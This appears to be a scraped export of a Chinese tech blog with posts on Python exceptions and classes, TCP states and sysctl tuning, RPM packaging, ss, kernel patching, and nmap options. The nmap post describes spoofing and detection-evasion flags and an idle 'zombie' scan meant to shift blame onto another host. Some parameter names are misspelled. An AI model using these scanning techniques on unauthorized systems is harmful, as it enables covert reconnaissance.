当我们认为某些代码可能会出错时: 可以用try来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即except语句块，执行完except后，如果有finally语句块，则执行finally语句块，至此，执行完毕。 1234567891011try: print(&apos;try...&apos;) r = 10 / int(&apos;a&apos;) print(&apos;result:&apos;, r)except ValueError as e: print(&apos;ValueError:&apos;, e)except ZeroDivisionError as e: print(&apos;ZeroDivisionError:&apos;, e)finally: print(&apos;finally...&apos;)print(&apos;END&apos;) 记录错误如果不捕获错误，自然可以让Python解释器来打印出错误堆栈，但程序也被结束了。既然我们能捕获错误，就可以把错误堆栈打印出来，然后分析错误原因，同时，让程序继续执行下去。 Python内置的logging模块可以非常容易地记录错误信息： 123456789101112131415161718# err_logging.pyimport loggingdef foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar(&apos;0&apos;) except Exception as e: logging.exception(e)main()print(&apos;END&apos;) 同样是出错，但程序打印完错误信息后会继续执行，并正常退出： 1234567891011$ python3 err_logging.pyERROR:root:division by zeroTraceback (most recent call last): File &quot;err_logging.py&quot;, line 13, in main bar(&apos;0&apos;) File &quot;err_logging.py&quot;, line 9, in bar return foo(s) * 2 File &quot;err_logging.py&quot;, line 6, in foo return 10 / int(s)ZeroDivisionError: division by zeroEND 通过配置，logging还可以把错误记录到日志文件里，方便事后排查。 日志文件可以通过 @log 装饰器来打印日志 抛出错误因为错误是class，捕获一个错误就是捕获到该class的一个实例。因此，错误并不是凭空产生的，而是有意创建并抛出的。Python的内置函数会抛出很多类型的错误，我们自己编写的函数也可以抛出错误。 如果要抛出错误，首先根据需要，可以定义一个错误的class，选择好继承关系，然后，用raise语句抛出一个错误的实例： 1234567891011# err_raise.pyclass FooError(ValueError): passdef foo(s): n = int(s) if n==0: raise FooError(&apos;invalid value: %s&apos; % s) return 10 / nfoo(&apos;0&apos;) 执行，可以最后跟踪到我们自己定义的错误： 1234567$ python3 err_raise.py Traceback (most recent call last): File &quot;err_throw.py&quot;, line 11, in &lt;module&gt; foo(&apos;0&apos;) File &quot;err_throw.py&quot;, line 8, in foo raise FooError(&apos;invalid value: %s&apos; % s)__main__.FooError: invalid value: 0 只有在必要的时候才定义我们自己的错误类型。如果可以选择Python已有的内置的错误类型（比如ValueError，TypeError），尽量使用Python内置的错误类型。 最后，我们来看另一种错误处理的方式： 12345678910111213141516# err_reraise.pydef foo(s): n = int(s) if n==0: raise ValueError(&apos;invalid value: %s&apos; % s) return 10 / ndef bar(): try: foo(&apos;0&apos;) except ValueError as e: print(&apos;ValueError!&apos;) raisebar() 在bar()函数中，我们明明已经捕获了错误，但是，打印一个ValueError!后，又把错误通过raise语句抛出去了，这不有病么？ 其实这种错误处理方式不但没病，而且相当常见。捕获错误目的只是记录一下，便于后续追踪。但是，由于当前函数不知道应该怎么处理该错误，所以，最恰当的方式是继续往上抛，让顶层调用者去处理。好比一个员工处理不了一个问题时，就把问题抛给他的老板，如果他的老板也处理不了，就一直往上抛，最终会抛给CEO去处理。 raise语句如果不带参数，就会把当前错误原样抛出。 断言凡是用print()来辅助查看的地方，都可以用断言（assert）来替代： 1234567def foo(s): n = int(s) assert n != 0, &apos;n is zero!&apos; return 10 / ndef main(): foo(&apos;0&apos;) assert的意思是，表达式n != 0应该是True，否则，根据程序运行的逻辑，后面的代码肯定会出错。 如果断言失败，assert语句本身就会抛出AssertionError： 1234$ python err.pyTraceback (most recent call last): ...AssertionError: n is zero! 程序中如果到处充斥着assert，和print()相比也好不到哪去。不过，启动Python解释器时可以用-O参数来关闭assert： 1234$ python -O err.pyTraceback (most recent call last): ...ZeroDivisionError: division by zero 关闭后，你可以把所有的assert语句当成pass来看。","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"Linux Tcp状态以及 sysctl.conf  配置参数","slug":"network/Linux-Tcp状态以及-sysctl-conf-配置参数","date":"2018-01-23T13:05:54.000Z","updated":"2018-11-19T16:06:59.707Z","comments":true,"path":"2018/01/23/network/Linux-Tcp状态以及-sysctl-conf-配置参数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/23/network/Linux-Tcp状态以及-sysctl-conf-配置参数/","excerpt":"Linux Tcp 状态 以及 sysctl.conf 配置参数说明： 通常情况下:一个正常的TCP连接，都会有三个阶段:1、TCP三次握手;2、数据传送;3、TCP四次挥手 里面的几个概念： SYN: (同步序列编号,Synchronize Sequence Numbers) ACK: (确认编号,Acknowledgement Number) FIN: (结束标志,FINish)","text":"Linux Tcp 状态 以及 sysctl.conf 配置参数说明： 通常情况下:一个正常的TCP连接，都会有三个阶段:1、TCP三次握手;2、数据传送;3、TCP四次挥手 里面的几个概念： SYN: (同步序列编号,Synchronize Sequence Numbers) ACK: (确认编号,Acknowledgement Number) FIN: (结束标志,FINish) ####TCP三次握手(创建 OPEN) 客户端发起一个和服务创建TCP链接的请求，这里是SYN(J) 服务端接受到客户端的创建请求后，返回两个信息： SYN(K) + ACK(J+1) 客户端在接受到服务端的ACK信息校验成功后(J与J+1)，返回一个信息：ACK(K+1) 服务端这时接受到客户端的ACK信息校验成功后(K与K+1)，不再返回信息，后面进入数据通讯阶段 数据通讯 客户端/服务端 read/write数据包 TCP四次握手(关闭 finish) 客户端发起关闭请求，发送一个信息：FIN(M) 服务端接受到信息后，首先返回ACK(M+1),表明自己已经收到消息。 服务端在准备好关闭之前，最后发送给客户端一个 FIN(N)消息，询问客户端是否准备好关闭了 客户端接受到服务端发送的消息后，返回一个确认信息: ACK(N+1) 最后，服务端和客户端在双方都得到确认时，各自关闭或者回收对应的TCP链接。 ####详细的状态说明(以及linux相关参数调整) /etc/sysctl.conf SYN_SEND 客户端尝试连接服务端，通过open方法。也就是TCP三次握手中的第一步后, 客户端状态 sysctl -w net.ipv4.tcp_syn_retries = 2 作为客户端可以设置SYN包的重试次数，默认5次(大约180s) SYN_RECEIVED 服务接收创建请求的SYN之后，也就是TCP三次握手的第二步，发送ACK数据包之前。 注意服务端状态，一般15个左右正常，如果很大，怀疑遭受SYN_GLOOD攻击。 sysctl -w net.ipv4.tcp_max_syn_backing = 4096, 设置该状态的等待队列数，默认1024，调大后可以适当放置syn_flood, 可参见 man 7 tcp. sysctl -w net.ipv4.tcp_syncookies = 1 ，打开syn backing队列不足的时候，提供一种机制临时将syn链接换出 sysctl -w net.ipv4.tcp_syn_retries = 2 作为客户端可以设置SYN包的重试次数，默认5次(大约180s) ESTABLISHED 客户端接受到服务端的ACK包后的状态，服务端在发出ACK在一定时间后即为 ESTABLISHED sysctl -w net.ipv4.tcp_keepalive_time = 1200 默认是7200秒(2小时). 系统针对空闲链接会进行心跳检查，如果超过 net.ipv4.tcp_keepalive_probes * net.ipv4.tcp_keepalive_intvl = 默认 11 分,终止对应的tcp链接，可适当调整心跳检查频率。 目前线上的监控waring:600 , critial : 800 FIN_WAIT1 主动关闭的一方，在发出FIN请求之后，也就是TCP四次挥手的第一步 CLOSE_WAIT 被关闭的一方，在接受到客户端的FIN后，也就是在TCP四次挥手的第二步。 FIN_WAIT2 主动关闭的一方，在接受到被动关闭一方的ACK后，也就是TCP四次挥手的第二步。 sysctl -w net.ipv4.tcp_fin_timeout=30, 可以设定被动关闭方返回FIN后的超时时间，有效回收链接，避免syn-flood. LASK_ACK 被关闭一方，在发送ACK后一段时间后(确保客户端已经收到), 在发起一个FIN请求。也就是TCP四次握手第三步 TIME_WAIT 主动关闭的一方，在收到被动关闭的FIN包后，发送ACK。这就是TCP四次握手的第四部。 sysctl -w net.ipv4.tcp_tw_recycle = 1 打开快速回收TIME_WAIT。Enabling this option is not recommended since this causes problems when working with NAT (Network Address Translation) sysctl -w net.ipv4.tcp_tw_reuse = 1 快速回收并重用TIME_WAIT的链接。 net.ipv4.tcp_max_tw_buckets 处于time_wait状态的最多连接数， 默认为 180000。 补充： 主动关闭方在接收到被动关闭放的FIN请求后，发送成功给对方一个ACK后，将自己的状态由FIN_WAIT2 修改为TIME_WAIT， 而必须再等2倍的MSL(Maximun Segment Lifetime, MSL是一个数据报在internetwork中能存在的时间) 时间之后，双方才能把状态都改为CLOSED以关闭链接。目前RHEL中保持TIME_WAIT状态的时间为60s。 keepalive策略可以有效避免进行三次握手和四次挥手的动作。 TCP报文之-tcp dup ack 、tcp Out-of-Order tcpdump抓取HTTP包 – 以及 Tcp 参数 linux设置","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Centos/"}]},{"title":"RPM 打包","slug":"rebuild/RPM-打包","date":"2018-01-20T13:51:07.000Z","updated":"2018-11-19T16:07:21.076Z","comments":true,"path":"2018/01/20/rebuild/RPM-打包/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/20/rebuild/RPM-打包/","excerpt":"RPM（Redhat Package Manager）是用于Redhat、CentOS、Fedora等Linux 分发版（distribution）的常见的软件包管理器。 同时rpm打包需要特定的目录及结构。","text":"RPM（Redhat Package Manager）是用于Redhat、CentOS、Fedora等Linux 分发版（distribution）的常见的软件包管理器。 同时rpm打包需要特定的目录及结构。 系统准备1yum install rpmdevtools rpmdev-setuptree 程序将创建 ~/rpmbuild 目录，以及一系列预设的子目录（如 SPECS 和 BUILD），你将使用它们作为打包目录。另外，还会创建 ~/.rpmmacros 文件，它用于设置各种选项。 RPM打包基本过程 与 基础知识一般情况，您应该把源代码包，比如由开发者发布的以 .tar.gz 结尾的文件，放入 ~/rpmbuild/SOURCES 目录。将.spec 文件放入 ~/rpmbuild/SPECS 目录，并命名为 “软件包名.spec” 。当然， 软件包名 就是最终 RPM 包的名字。为了创建二进制（Binary RPM）和源码软件包（SRPM），您需要将目录切换至 ~/rpmbuild/SPECS 并执行： 1$ rpmbuild -ba NAME.spec 阶段 读取的目录 写入的目录 具体动作 %prep %_sourcedir %_builddir 读取位于 %_sourcedir 目录的源代码和 patch 。之后，解压源代码至 %_builddir 的子目录并应用所有 patch。 %build %_builddir %_builddir 编译位于 %_builddir 构建目录下的文件。通过执行类似 “./configure &amp;&amp; make“ 的命令实现。 %install %_builddir %_buildrootdir 读取位于 %_builddir 构建目录下的文件并将其安装至 %_buildrootdir 目录。这些文件就是用户安装 RPM 后，最终得到的文件。注意一个奇怪的地方: 最终安装目录 不是 构建目录。通过执行类似 “make install“ 的命令实现。 %check %_builddir %_builddir 检查软件是否正常运行。通过执行类似 “make test“ 的命令实现。很多软件包都不需要此步。 bin %_buildrootdir %_rpmdir 读取位于 %_buildrootdir 最终安装目录下的文件，以便最终在 %_rpmdir 目录下创建 RPM 包。在该目录下，不同架构的 RPM 包会分别保存至不同子目录， “noarch“ 目录保存适用于所有架构的 RPM 包。这些 RPM 文件就是用户最终安装的 RPM 包。 src %_sourcedir %_srcrpmdir 创建源码 RPM 包（简称 SRPM，以.src.rpm 作为后缀名），并保存至 %_srcrpmdir 目录。SRPM 包通常用于审核和升级软件包。 在 rpmbuild 中，对上表中的每个宏代码都有对应的目录： 宏代码 名称 默认位置 用途 %_specdir Spec 文件目录 ~/rpmbuild/SPECS 保存 RPM 包配置（.spec）文件 %_sourcedir 源代码目录 ~/rpmbuild/SOURCES 保存源码包（如 .tar 包）和所有 patch 补丁 %_builddir 构建目录 ~/rpmbuild/BUILD 源码包被解压至此，并在该目录的子目录完成编译 %_buildrootdir 最终安装目录 ~/rpmbuild/BUILDROOT 保存 %install 阶段安装的文件 %_rpmdir 标准 RPM 包目录 ~/rpmbuild/RPMS 生成/保存二进制 RPM 包 %_srcrpmdir 源代码 RPM 包目录 ~/rpmbuild/SRPMS 生成/保存源码 RPM 包(SRPM) 如果某一阶段失败，请查看输出信息以了解失败原因，并根据需要修改 .spec 文件。 示例1rpmdev-setuptree 生成目录如下:123456rpmbuild/├── BUILD├── RPMS├── SOURCES├── SPECS└── SRPMS 也可以自己创建 1mkdir -p ~/rpmbuild/&#123;BUILD,RPMS,SOURCES,SPECS,SRPMS&#125; 示例代码 hello.c123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; printf(&quot;hello,world&quot;); return 0;&#125; 打包 1234mkdir hello-1mv hello.c hello-1tar -czvf hello-1.tar.gz hello-1mv hello-1.tar.gz SOURCES/ 编写hello.spec12345678910111213141516171819202122Name: helloVersion: 1 Release: 1%&#123;?dist&#125;Summary: hello,world program Group: Application License: GPL URL: https://www.gangzai.online Source: hello-1.tar.gz%descriptionhello,world%prep%setup -q%build ## 自动会到BUILD目录下查找与tar.gz同名文件夹,进入执行 %build 所指示命令gcc hello.c -o hello%installinstall -m 755 hello /home/postgres/hello 执行过程1rpmbuild -ba SPEC/hello.spec 形成目录结构1234567891011121314.├── BUILD│ └── hello-1├── BUILDROOT├── RPMS│ └── x86_64├── SOURCES│ └── hello-1.tar.gz├── SPECS│ └── hello.spec└── SRPMS └── hello-1-1.el7.centos.src.rpm8 directories, 3 filess 安装 RPM包1rpm -i SRPMS/hello-1-1.el7.centos.src.rpm 参考 RPM 包制作 How to create an RPM package/zh-cn","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"ss","slug":"commands/ss","date":"2018-01-18T10:20:15.000Z","updated":"2018-12-05T11:07:28.710Z","comments":true,"path":"2018/01/18/commands/ss/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/18/commands/ss/","excerpt":"ss 不使用netstat的原因 iproute2","text":"ss 不使用netstat的原因 iproute2 SS简介SS命令是一个用来查看socket信息的命令，可以通过man ss可以查看。 12345678NAME ss - another utility to investigate socketsSYNOPSIS ss [options] [ FILTER ]DESCRIPTION ss is used to dump socket statistics. It allows showing information similar to netstat. It can display more TCP and state informations than other tools. 不使用netstat的原因当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接cat /proc/net/tcp，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。 天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。 iproute2 工具命令 用途 net-tool (被淘汰) iproute2 地址和链路配置 ifconfig ip addr, ip link 路由器 route ip route 邻居 arp ip neigh VLAN vconfig ip link 隧道 iptunnel ip tunnel 组播 ipmaddr ip maddr 统计 netstat ss ss-ip addr","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Kernel-基础知识","slug":"kernel/Kernel-基础知识","date":"2018-01-18T01:58:30.000Z","updated":"2018-11-19T16:14:13.671Z","comments":true,"path":"2018/01/18/kernel/Kernel-基础知识/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/18/kernel/Kernel-基础知识/","excerpt":"内核基本知识: 内核结构 补丁 内核编译","text":"内核基本知识: 内核结构 补丁 内核编译 内核代码树介绍:linux-2.6.29 ｜－arch : 包含和硬件体系结构相关的代码 ｜－block : 硬盘调度算法，不是驱动 ｜－firmware : 固件，如BOIS ｜－Documentation: 标准官方文档 ｜－dirver : linux设备驱动 ｜－fs : 内核所支持的文件体系 ｜－include ：头文件。linux/module.h linux/init.h 常用库。 ｜－init ：库文件代码，C库函数在内核中的实现。 ​ init/main.c -&gt;start_kernel-&gt;内核执行第一条代码 ｜－ipc : 进程件通信 ｜－mm ：内存管理 ｜－kernel : 内核核心部分，包括进程调度等 ｜－net ：网络协议 ｜－sound : 所有音频相关 内核补丁:补丁基于某个版本内核生成的，用于升级旧版本内核。 对应版本的补丁只能用于对应版本的内核 如果在已打补丁的内核中再打补丁，需要先卸载原先补丁。 制作补丁: 1diff -Nur linux-2.6.30/ linux-2.6.30.1/ &gt; linux-2.6.30.1.patch 打补丁: 12345cd linux-2.6.30 //！！注意在原文件夹的目录中打补丁patch -p1 &lt; ../linux-2.6.30.1.patch //-p1是忽略一级目录##单文件patch vimrc &lt; vim.1.patch // 即可 撤销补丁 12cd linux-2.6.30 //！！注意在原文件夹的目录中打补丁patch -R &lt; ../linux-2.6.30.1.patch //撤销补丁 ​ 内核与模块编译1make = make bzImage + make modules 如果只编译内核， 即只编译配置文件中的 -y 选项， 可以直接用命令make bzImage 如果只编译模块， 即只编译配置文件中的 -m 选项, 可以直接使用 make modules 只是想单独编译一个模块， 则可以使用: 1make -C /root/linux-2.6.29/xxx/ M=`pwd` module //-C 指定内核makefile的路径，可以使用相对路径。 //-M 指定要编译的文件的路径，同样使用相对路径。 编译生成的模块可以指定存放目录 1make -C /root/linux-2.6.29/xxx M=`pwd` modules_install INSTALL_MOD_PATH=/modules/","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"nmap 参数","slug":"commands/nmap-参数","date":"2018-01-15T00:59:48.000Z","updated":"2018-12-05T11:06:59.293Z","comments":true,"path":"2018/01/15/commands/nmap-参数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/15/commands/nmap-参数/","excerpt":"Nmap 功能介绍: 主机存活检测 端口探测 服务识别 操作系统识别 硬件地址检测 服务版本识别 漏洞扫描,使用nmap自带脚本","text":"Nmap 功能介绍: 主机存活检测 端口探测 服务识别 操作系统识别 硬件地址检测 服务版本识别 漏洞扫描,使用nmap自带脚本 namp1nmap -&#123;type(s)&#125; -&#123;opt(s)&#125; &#123;target&#125; 常用选项 扫描选项 名称 功能 -g 指定源端口 使用特定的源端口发送数据包 –spoof_mac Mac欺骗 创建虚假Mac地址发送数据包。可以随机化Mac地址 -S 源IP地址 伪造的源IP地址或者告诉Nmap使用哪个IP地址 -e 选择以太网接口 选择哪个网卡发送和接收数据 -F 快速扫描 在Nmap-services文件中将默认扫描缩减到100端口 -P 确定端口范围 选择扫描的端口 -R 反向Lookup 强制反向Lookup -N DNS解析 指向反向lookup -n 非DNS解析 不进行反向lookup -h 帮助文档 提供Nmap的帮助文档 -6 启用IPv6 扫描IPv6 -A 激进型 立刻启用许多扫描选项。慎用 -T(0-5) 时间选项 指定你想要的扫描激进程序 –scan_delay 添加延迟 在探测之间增加延迟 -sV 服务版本 探测服务软件的版本 常用扫描类型 扫描类型 名称 功能功能 -sA ACK扫描 检测端口是否开放。可用于探测防火墙 -sP ping扫描 快速网络发现 -sR PRC扫描 定位PRC应用。对成功扫描的机器进行记录 -sS TCP SYN扫描 快速和隐蔽的扫描。半开放扫描 -sT TCP扫描 完全建立链接，没有效率，容易引起注意 -sU UDP扫描 确定某个特定的UDP端口是否开放 -sX XMAS扫描 隐蔽扫描，对扫描特定配置的防火墙非常有用，通过RST包来判断端口是否关闭，扫描UNIX系统效果较好 -sL 列出扫描对象 列出将要扫描出的IP地址，使用-n确保不向网络中发送数据包 -sO IP协议扫描 寻找使用IP协议的主机 -sM FIN/ACK 隐蔽扫描。基于UNIX系统，查找RST数据包 -sI 闲置扫描 僵尸主机扫描，非常隐蔽 -sW 窗口扫描 检查RST包的TCP窗口值判断端口是否开放 输出格式 输出格式 名称 功能 -oA 所有 可检索的，常规的XML文件 -oG 可检索的 可检索的格式 -oX XML 结果输出成XML格式 -oN 常规 适合人阅读的格式 控制时间 -T ( 0 -5 ): 让你能够控制扫描的激进程序， 避免被检测到的最简单方式， 0 是最温和的扫描。 5 是最激进的只能在局域网中使用。 –max-hostgroup: 可将扫描的主机数量限制在一次一个。 –max-parallelism 10 : 一次仅允许10个探测请求。 –scan-delay： 允许你在两个探测之间停顿。 转嫁责任 - 僵尸扫描如果不被检测到的几率非常小，我们需要转嫁责任，可以使用空闲扫描 (idle scan), 让一个僵尸主机承担我们的扫描任务。 使用空闲扫描(-sI) 有一个重要的问题需要注意。必须找一台TCP Sequence Predicetion成功率高的僵尸主机。 如打印机，因为他们不存在恒定的网络流量，而且预测它们的TCP序列难度很低。 第一步： 寻找可能的僵尸主机 1sudo nmap -v -O -Pn -n 192.168.2.13 ##分别: 详细，操作系统检测，无ping，无域名解析 显示内容 123Network Distance: 0 hopsTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zeros 空闲扫描原理: 向僵尸主机发送 SYN/ACK数据包，从而得到带有分片ID(IPID)的RST报文。 发送使用僵尸主机IP地址的伪造数据包给目标主机。 如果目标端口关闭，将会给僵尸主机响应RST报文。如果目标端口开放。目标主机将向僵尸主机响应 SYN/ACK报文，僵尸主机发现这个非法的链接响应，因此向目标主机发送RST报文，这时IPID号开始增长。 通过向僵尸主机发送另一个SYN/ACK以退出上述循环并检查僵尸主机RST报文中的IPID是否每次增长2，同时目标主机的RST每次增长1. 重复以上步骤直到检测完主机的所有端口。 空闲扫描语法: 1nmap -p 23,53,80 -Pn -sI 192.168.2.13 192.168.2.254 指定特定端口，-Pn强调不使用ping(默认提供)，然后启动空闲扫描(-sI), 使用192.168.2.13作为僵尸主机， 192.168.2.254作为目标主机 nmap 脚本1234567891011SCRIPT SCAN:-sC: equivalent to --script=default--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts--script-args-file=filename: provide NSE script args in a file--script-trace: Show all data sent and received--script-updatedb: Update the script database.--script-help=&lt;Lua scripts&gt;: Show help about scripts. &lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories. -sC 是指的是采用默认配置扫描，与–script=default参数等价 –script=脚本名称，脚本一般都在Nmap的安装目录下的scripts目录中 那么Linux下可以查看脚本数量： 12345ls /usr/share/nmap/scripts/ | wc -l516# 如果目录可以使用 find / -iname scripts -type d | grep nmap 来查找 那么我当前的Nmap是有516个很使用的漏洞利用、工具脚本。也可以使用下面一条命令导出 ～ 1ls /usr/share/nmap/scripts/ | sed &apos;s/.nse//&apos; &gt; scripts.list 那么所有的脚本名称都在scripts.list中了，这样做的原因是因为我们传递脚本名称的时候，不能写脚本的文件扩展名(.nse)。 --script-args=key1=value1,key2=value2... 该参数是用来传递脚本里面的参数的，key1是参数名，该参数对应value1这个值，那么有更多的参数，使用逗号连接，后面例子中会给大家讲解。 –script-args-file=filename，使用文件来为脚本提供参数。 --script-trace 如果设置该参数，则所有的脚本收发请求过程。 --script-updatedb 在Nmap的scripts目录里有一个script.db，该文件中保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启nmap并且调用了此参数，则nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。 --script-help=脚本名称，调用该参数后，Nmap会输出该脚本名称对应的脚本使用参数，以及详细介绍信息。 脚本使用 Nmap 示例","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"}]},{"title":"Python-面向对象","slug":"gram/Python-面向对象","date":"2018-01-13T12:48:22.000Z","updated":"2018-11-19T16:12:58.206Z","comments":true,"path":"2018/01/13/gram/Python-面向对象/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/01/13/gram/Python-面向对象/","excerpt":"模块 使用模块 作用域 作用域 内置函数 访问限制 继承与多态 面向对象高级编程 slot @property 枚举类","text":"模块 使用模块 作用域 作用域 内置函数 访问限制 继承与多态 面向对象高级编程 slot @property 枚举类 模块为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。在Python中，一个.py文件就称之为一个模块（Module）。 使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。点这里查看Python的所有内置函数。 如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package）。 举个例子，一个abc.py的文件就是一个名字叫abc的模块，一个xyz.py的文件就是一个名字叫xyz的模块。 现在，假设我们的abc和xyz这两个模块名字与其他模块冲突了，于是我们可以通过包来组织模块，避免冲突。方法是选择一个顶层包名，比如mycompany，按照如下目录存放： 1234mycompany├─ __init__.py├─ abc.py└─ xyz.py 引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，abc.py模块的名字就变成了mycompany.abc，类似的，xyz.py的模块名变成了mycompany.xyz。 每一个包目录下面都会有一个__init__.py的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包。__init__.py可以是空文件，也可以有Python代码，因为__init__.py本身就是一个模块，而它的模块名就是mycompany。 使用模块我们以内建的sys模块为例，编写一个hello的模块： 1234567891011121314151617181920#!/usr/bin/env python3# -*- coding: utf-8 -*-&apos; a test module &apos;__author__ = &apos;Michael Liao&apos;import sysdef test(): args = sys.argv if len(args)==1: print(&apos;Hello, world!&apos;) elif len(args)==2: print(&apos;Hello, %s!&apos; % args[1]) else: print(&apos;Too many arguments!&apos;)if __name__==&apos;__main__&apos;: test() 第1行和第2行是标准注释，第1行注释可以让这个hello.py文件直接在Unix/Linux/Mac上运行，第2行注释表示.py文件本身使用标准UTF-8编码； 第4行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释； 第6行使用__author__变量把作者写进去，这样当你公开源代码后别人就可以瞻仰你的大名； 以上就是Python模块的标准文件模板，当然也可以全部删掉不写，但是，按标准办事肯定没错。 后面开始就是真正的代码部分。 你可能注意到了，使用sys模块的第一步，就是导入该模块： 1import sys 导入sys模块后，我们就有了变量sys指向该模块，利用sys这个变量，就可以访问sys模块的所有功能。 sys模块有一个argv变量，用list存储了命令行的所有参数。argv至少有一个元素，因为第一个参数永远是该.py文件的名称，例如： 运行python3 hello.py获得的sys.argv就是[&#39;hello.py&#39;]； 运行python3 hello.py Michael获得的sys.argv就是[&#39;hello.py&#39;, &#39;Michael]。 最后，注意到这两行代码： 12if __name__==&apos;__main__&apos;: test() 当我们在命令行运行hello模块文件时，Python解释器把一个特殊变量__name__置为__main__，而如果在其他地方导入该hello模块时，if判断将失败，因此，这种if测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。 我们可以用命令行运行hello.py看看效果： 1234$ python3 hello.pyHello, world!$ python hello.py MichaelHello, Michael! 如果启动Python交互环境，再导入hello模块： 123456$ python3Python 3.4.3 (v3.4.3:9b73f1c3e601, Feb 23 2015, 02:52:03) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import hello&gt;&gt;&gt; 导入时，没有打印Hello, word!，因为没有执行test()函数。 调用hello.test()时，才能打印出Hello, word!： 12&gt;&gt;&gt; hello.test()Hello, world! 作用域在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在Python中，是通过_前缀来实现的。 正常的函数和变量名是公开的（public），可以被直接引用，比如：abc，x123，PI等； 类似__xxx__这样的变量是特殊变量，可以被直接引用，但是有特殊用途， 比如上面的__author__，__name__就是特殊变量，hello模块定义的文档注释也可以用特殊变量__doc__访问，我们自己的变量一般不要用这种变量名； 类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等； 面向对象类和实例类(class) 和 实例 (instance) ， 类是抽象的模板, 实例是根据类创建出来的一个个具体的”对象”, 每个对象都拥有相同的方法, 但各自的数据可能不同。 在Python中，定义类是通过class关键字： 12class Student(object): pass class后面紧接着是类名，即Student，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类。 __init__ 与 数据封装__init__方法的第一个参数永远是self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到self，因为self就指向创建的实例本身。 定义一个特殊的__init__方法，在创建实例的时候，就把name，score等属性绑上去： 12345class Student(object): def __init__(self, name, score): self.name = name self.score = score 和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量self，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。 __str____str__()返回用户看到的字符串 只需要定义好__str__()方法，返回一个好看的字符串就可以了： 12345678&gt;&gt;&gt; class Student(object):... def __init__(self, name):... self.name = name... def __str__(self):... return &apos;Student object (name: %s)&apos; % self.name...&gt;&gt;&gt; print(Student(&apos;Michael&apos;))Student object (name: Michael) 